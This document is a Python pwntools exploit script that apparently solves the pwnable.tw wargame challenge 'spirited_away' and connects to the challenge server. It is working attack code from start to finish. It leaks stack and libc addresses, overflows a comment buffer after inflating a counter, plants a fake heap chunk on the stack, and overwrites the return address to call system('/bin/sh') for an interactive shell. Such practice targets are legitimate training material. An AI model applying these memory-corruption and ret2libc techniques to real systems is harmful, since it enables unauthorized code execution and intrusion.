#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('spirited_away_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*survey+447
        b*survey+305
        b*0x080486F8   
        b*0x0804873E 
        b*survey+125
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10204
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10204)
else:
    p = process([exe.path])
def comment(name, age, reason, comment):
    sa(b'Please enter your name: ', name)
    sla(b'Please enter your age: ', age)
    sa(b'Why did you came to see this movie? ', reason)
    sa(b'Please enter your comment: ', comment)

a = b'c'*0x38

comment(p64(0xdeadbeef), b'-1', a, b'b'*0x3c)
ru(a)
stack_leak = u32(r(4))
info(f'stack leak: {hex(stack_leak)}')
r(4)
libc_leak  = u32(r(4))
libc.address = libc_leak-0x5d33b
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')
sa(b'Would you like to leave another comment? <y/n>: ', b'y')

comment(b'ahi', b'-1', b'c'*0x38, b'b'*0x3c)

sa(b'Would you like to leave another comment? <y/n>: ', b'y')

for i in range(98):
    comment(b'ahi', b'-1', b'c'*80, b'b'*0x3c)
    sa(b'Would you like to leave another comment? <y/n>: ', b'y')
info(f'stack leak: {hex(stack_leak)}')

# begin of sprintf dest: 0xffffcca0
"""
bof at name and comment 

"""
def fixed_comment(name, reason, comment):
    sa(b'Please enter your name: ', name)
    sa(b'Why did you came to see this movie? ', reason)
    sa(b'Please enter your comment: ', comment)

comment_load = flat(
    b'h'*0x54,
    stack_leak-0x68
)

reason = flat(
    b'b'*4,
    0x41, b'a'*0x38,
    0x21, 0x21
)
# heap_ptr: 0xffffcd34
# stack: 0xffffcda8
# comment: 0xffffcce0
# name, age, reason, comment
# GDB()

fixed_comment(b'evil', reason, comment_load)
sa(b'Would you like to leave another comment? <y/n>: ', b'y')

load = flat(
    b'1'*0x4c,
    libc.sym.system,
    libc.sym.system,
    next(libc.search(b'/bin/sh')),
    next(libc.search(b'/bin/sh'))

)

fixed_comment(load, b'awdhwu', b'???')
info(f'stack leak: {hex(stack_leak)}')
info(f'libc base: {hex(libc.address)}')
info(f'libc leak: {hex(libc_leak)}')

sa(b'Would you like to leave another comment? <y/n>: ', b'n')


p.interactive()
